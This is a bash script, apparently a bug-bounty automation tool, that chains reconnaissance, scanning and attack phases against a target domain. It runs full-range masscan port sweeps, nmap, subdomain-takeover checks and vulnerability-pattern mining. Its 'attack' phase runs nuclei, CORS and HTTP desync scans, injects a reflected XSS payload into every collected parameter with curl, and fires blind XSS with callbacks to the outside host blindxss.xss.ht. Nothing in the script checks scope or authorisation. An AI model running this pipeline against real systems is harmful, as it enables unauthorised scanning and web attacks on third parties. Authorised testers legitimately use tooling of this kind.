#!/bin/bash

bold="\e[1m"
red="\e[31m"
green="\e[32m"
blue="\e[34m"
end="\e[0m"
VERSION="2022-06-1"
icon="\U2705"
PLC=$(pwd) 

# Need to have the wildcards(contains root domains) file in the same dir u run that 

wildcards=$1
domain=$2
phase=$3

########################################################################################################################################################
############################################ ------------> phase 1 , assets collecting <--------------- ################################################

    # subdomains 
SubEnum(){
    spinner "${bold}SubEnum${end}" & PID="$!" 
    subenum -l $wildcards  > /dev/null
    cat *.txt | sort -u > ./assets/domains
    rm *.txt
    kill ${PID}
    echo -e "$bold[-] Sudomains Found $end:$red $(wc -l < ./assets/domains) $end$icon"     
}
    # probe domains 
Httprobe(){
    spinner "${bold}Httprobe${end}" & PID="$!"
    cat ./assets/domains | httprobe -c 80 > ./assets/hosts
    kill ${PID}
    echo -e "$bold[-] Alive Hosts $end:$red $(wc -l < ./assets/hosts) $end$icon" 
    
}    
    # collecting urls 
Urls(){
    spinner "${bold}waybackurls${end}" & PID="$!"
    cat $wildcards | waybackurls > ./assets/wayback_urls    
    cat $wildcards | gau  > ./assets/gau_urls
    cat ./assets/wayback_urls ./assets/gau_urls | sort -u > ./assets/urls
        # removing duplicted and removes parameters values
    cat assets/urls | uro > assets/uniqe_urls
    rm ./assets/wayback_urls ./assets/gau_urls
    kill ${PID}
    echo -e "$bold[-] Urls Founded $end:$red $(wc -l < ./assets/urls) $end$icon"
    echo -e "$bold[-] Uniqe Urls  $end:$red $(wc -l < ./assets/uniqe_urls) $end$icon"

}
    # feching parameters and deal with them 
Parameters(){
        # fetching urls with parameters
    cat ./assets/urls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" > ./assets/urls_with_parameters
        # collecting the parameters name only 
    cat ./assets/urls_with_parameters | unfurl keys | sort -u > ./assets/parameters  
    echo -e "$bold[-] Urls With Parameters  $end:$red $(wc -l < ./assets/urls_with_parameters) $end$icon"   

}

################################ look for arjun to use it with parameters file <------------------------------------------------------------------------

JsEnum(){
        # collecting js files 
    cat ./assets/urls | grep -iE '\.js' | grep -ivE '\.json' | sort -u  > ./assets/jsfiles

    ########################### anthor tool to use also , check cherry tree mindmap <-------------------------------------------------------------------
    echo -e "$bold[-] Js Files $end:$red $(wc -l < ./assets/jsfiles) $end$icon"  
}

Ips(){
    spinner "${bold}Massdns${end}" & PID="$!"
        # first download resolvers to use , it keeps updated so we  download every time 
    wget https://raw.githubusercontent.com/janmasarik/resolvers/master/resolvers.txt > /dev/null

        # use masscan to resolve ips 
     massdns -r resolvers.txt -t A -o S -w ./assets/massdns.out ./assets/domains  > /dev/null

        # filter the masscan output to just ips and ports 
    cat ./assets/massdns.out | cut -d " " -f3 | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" > ./assets/all-ips 
    rm ./assets/massdns.out

        # clean cloud flare ips from the list 
    python3 ~/tools/clean_ips.py ./assets/all-ips ./assets/ips  > /dev/null
    kill ${PID}   
    echo -e "$bold[-] Ips $end:$red $(wc -l < ./assets/ips) $end$icon"   
           
}

########################################################################################################################################################
############################################ ------------> phase 2 , information Gathering <--------------- ############################################

    # searching for data in js files
JScan(){
    spinner "${bold}JS Scanning${end}" & PID="$!"
    python3 ~/tools/jsscaner.py ./assets/jsfiles ~/tools/JSScanner/regex.txt > ./vulnerabilites/jsSecrest 
    rm out.txt.txt 2> /dev/null
    kill ${PID}   
    echo -e "$bold[-] JS Scanning $end:$red Done $end$icon" 
}

    # scan found ips for open ports 
PortScaning(){
    spinner "${bold}MasScan${end}" & PID="$!"
        # Scan the ips collected for open ports 
    sudo masscan -iL ./assets/ips -p1-65535 --rate=1000  -oL ./info/masscan.out > /dev/null
        # Filter the masscan output to just contaiin ips and ports 
    sed -i -e "/#/d" -e "/^$/d" ./info/masscan.out
 	cut -d " " -f3,4 ./info/masscan.out | awk '{print($2","$1)}' | sort -V > ./info/open-ports
 	python3 ~/tools/nmap-input-file.py info/open-ports info/nmap_input_file > /dev/null
    rm info/masscan.out 
    kill ${PID}   
    echo -e "$bold[-] Port Scanning $end:$red Done $end$icon" 
}
    # scan the open ports
ServicesScan(){
    spinner "${bold}Nmap${end}" & PID="$!"
    bash ~/tools/nmap.sh info/nmap_input_file info/ $domain advanced > /dev/null
    kill ${PID}   
    echo -e "$bold[-] Services Scanning $end:$red Done $end$icon" 
}
    # identify the WAF
WAFIdentification(){
    spinner "${bold}wafw00f${end}" & PID="$!"
    wafw00f https://$domain -o ./info/waf_info > /dev/null
    kill ${PID}   
    echo -e "$bold[-] WAF Identification $end:$red Done $end$icon"
}

CmsIdentification(){ :; }    

VirtualHosts(){ :; } 

GithubRecon(){ :; }
    # scan for subdomain takeoner
SubdomainsTakeover(){
    spinner "${bold}subjack${end}" & PID="$!"    
    subjack -w assets/domains -t 100 -timeout 30 -o vulnerabilites/subover -ssl > /dev/null
    kill ${PID}   
    echo -e "$bold[-] Subdomains Takeover check $end:$red Done $end$icon"
}
    # requst the hosts , and store headers & body of the response of each requst in a file , can use that to look for info
FFF(){
    spinner "${bold}FFF${end}" & PID="$!"      
    cat assets/hosts | fff -d 1 -S -o info/fff > /dev/null
    kill ${PID}   
    echo -e "$bold[-] FFF $end:$red Done $end$icon"
}

GF(){
        # search for known pattern for known Vuln.
    spinner "${bold}GF${end}" & PID="$!"
    mkdir ./info/gf

    cat ./assets/urls_with_parameters  | gf lfi > ./info/gf/lfiparams
    cat ./assets/urls_with_parameters  | gf xss > ./info/gf/xssparams
    cat ./assets/urls_with_parameters  | gf rce > ./info/gf/rceparams
    cat ./assets/urls_with_parameters  | gf ssrf > ./info/gf/ssfrparams
    cat ./assets/urls_with_parameters  | gf idor > ./info/gf/idorparams
    cat ./assets/urls_with_parameters  | gf sqli > ./info/gf/sql
    cat ./assets/urls_with_parameters  | gf redirect > ./info/gf/redirectparams
    kill ${PID}   
    echo -e "$bold[-] GF $end:$red Done $end$icon"


}

########################################################################################################################################################
############################################ ------------> phase 3 , Vulnerabilites scaning <--------------- ###########################################

Nuclei(){
        # search for Vulnerabilites 
    nuclei  -t ~/nuclei-templates/ -list assets/uniqe_urls | tee ./vulnerabilites/nuclei

}
cors(){
    corscanner -i assets/uniqe_urls -t 100 | tee  vulnerabilites/cors
}

Xss(){
        # blind xss
    cat ./info/gf/xssparams | sed 's/=.*/=/' | sort -u | tee ./info/Possible_xss.txt && cat ./info/Possible_xss.txt | dalfox -b blindxss.xss.ht  pipe > ./vulnerabilites/blind_xss 
        # reflected
    cat ./assets/urls_with_parameters | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done | tee ./vulnerabilites/relected_xss
}

HTTP_Desync(){
    cat ./assets/hosts | python3 ~/tools/smuggler/smuggler.py | tee ./vulnerabilites/HTTP_Desync 
}
#JIRA(){
#    Jira-Lens -r ./assets/hosts | tee ./vulnerabilites/jira
#}


########################################################################################################################################################

        # phase 1
collect(){       
mkdir assets info vulnerabilites
    echo -e "$bold Collecting Phase $end$red Started $end"
    SubEnum
    Httprobe
    Urls
    Parameters
    JsEnum
    Ips
}   

        # phase 2 
dig(){
    echo -e "$bold Digging Phase $end$red Started $end"
    JScan
    PortScaning   
    ServicesScan
    WAFIdentification
    SubdomainsTakeover
    #CmsIdentification
    #VirtualHosts
    #GithubRecon
    FFF
    GF
}
        # phase 3
attack(){
    echo -e "$bold Attacking Phase $end$red Started $end"
    Nuclei
    cors
    Xss
    HTTP_Desync
 #   JIRA
    
}
##################################################################################################################################################################
Banner(){
cat << "EOF" 
                                                    
             _           _           
            | |         | |          
            | |    _   _| |    _   _ 
            | |   | | | | |   | | | |
            | |___| |_| | |___| |_| |
            |______\__, |______\__, |
                    __/ |       __/ |
                   |___/       |___/ 

    Slowly Is The Fastest Way To Get There.! 0.0 | @karem Atef   

EOF
}
spinner(){
	processing="${1}"
	while true; 
	do
		dots=(
			"/"
			"-"
			"\\"
			"|"
			)
		for dot in ${dots[@]};
		do
			printf "[${dot}] ${processing} \U1F50E"
			printf "                                    \r"
			sleep 0.3
		done
		
	done
}


####################################################################################################################################################################
########################################################### Start The Script ##########################################################################################

Banner
case $phase in

    collect)
        collect
            ;;
    dig)
        dig
            ;;
    attack)
        attack
            ;;
    all)
        collect
        dig
        attack
            ;;
esac

